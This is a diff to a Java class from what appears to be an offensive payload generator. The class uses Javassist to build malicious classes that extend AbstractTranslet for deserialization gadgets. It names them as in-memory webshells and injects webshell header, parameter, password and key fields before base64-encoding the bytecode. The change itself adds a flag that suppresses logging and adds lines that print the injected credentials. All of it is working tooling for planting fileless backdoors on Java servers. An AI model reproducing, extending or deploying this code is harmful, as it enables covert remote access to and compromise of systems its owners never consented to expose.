@@ -34,7 +34,7 @@ public class JavaClassModifier {
         extendsAbstractTranslet(ctClass, javaClassHelper);
 
         // JavaClass 信息修改
-        byte[] classBytes = ctClassBuilder(ctClass, javaClassHelper);
+        byte[] classBytes = ctClassBuilder(ctClass, javaClassHelper, null);
 
         return classBytes;
     }
@@ -46,12 +46,12 @@ public class JavaClassModifier {
      * @param javaClassHelper
      * @throws Exception
      */
-    public static byte[] ctClassBuilder(CtClass ctClass, JavaClassHelper javaClassHelper) throws Exception {
+    public static byte[] ctClassBuilder(CtClass ctClass, JavaClassHelper javaClassHelper, Object unChangeFlag) throws Exception {
         ctClass.rebuildClassFile();
         // 清除所有注解
         JavaClassUtils.clearAllAnnotations(ctClass);
 
-        if (javaClassHelper.getCLASSNAME() != null) {
+        if (javaClassHelper.getCLASSNAME() != null && unChangeFlag == null) {
             // 用于需要类名来生成的内存马
             ctClass.setName(javaClassHelper.getCLASSNAME());
             Printer.blueInfo("JavaClass Name (Also MS ClassName): " + javaClassHelper.getCLASSNAME());
@@ -60,7 +60,8 @@ public class JavaClassModifier {
             String javaClassName = randomJavaClassName(javaClassHelper);
             // 修改类名
             ctClass.setName(javaClassName);
-            Printer.blueInfo("JavaClass Name: " + javaClassName);
+            if (unChangeFlag == null)
+                Printer.blueInfo("JavaClass Name: " + javaClassName);
         }
 
         // 目前唯一用处 用于本地文件加载时必要的类名
@@ -95,7 +96,8 @@ public class JavaClassModifier {
 //        ctClass.getClassFile().setMajorVersion(50);
         classBytes[7] = 50;
 
-        Printer.blueInfo("JavaClass: " + CryptoUtils.base64encoder(classBytes));
+        if (unChangeFlag == null)
+            Printer.blueInfo("JavaClass: " + CryptoUtils.base64encoder(classBytes));
         ctClass.writeFile("/tmp");
         return classBytes;
     }
@@ -139,16 +141,20 @@ public class JavaClassModifier {
 
         // 固定
         if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.HEADER)) {
+            Printer.yellowInfo(String.format("Header: %s", javaClassHelper.getHEADER()));
             JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.HEADER, String.format("private static String %s = \"%s\";", JavaClassModifiable.HEADER, javaClassHelper.getHEADER()));
         }
         if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.PARAM)) {
+            Printer.yellowInfo(String.format("Param: %s", javaClassHelper.getPARAM()));
             JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.PARAM, String.format("private static String %s = \"%s\";", JavaClassModifiable.PARAM, javaClassHelper.getPARAM()));
         }
 
         if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.pass)) {
+            Printer.yellowInfo(String.format("pass: %s", javaClassHelper.getPass()));
             JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.pass, String.format("private static String %s = \"%s\";", JavaClassModifiable.pass, javaClassHelper.getPass()));
         }
         if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.key)) {
+            Printer.yellowInfo(String.format("key: %s", javaClassHelper.getKey()));
             JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.key, String.format("private static String %s = \"%s\";", JavaClassModifiable.key, javaClassHelper.getKey()));
         }
     }
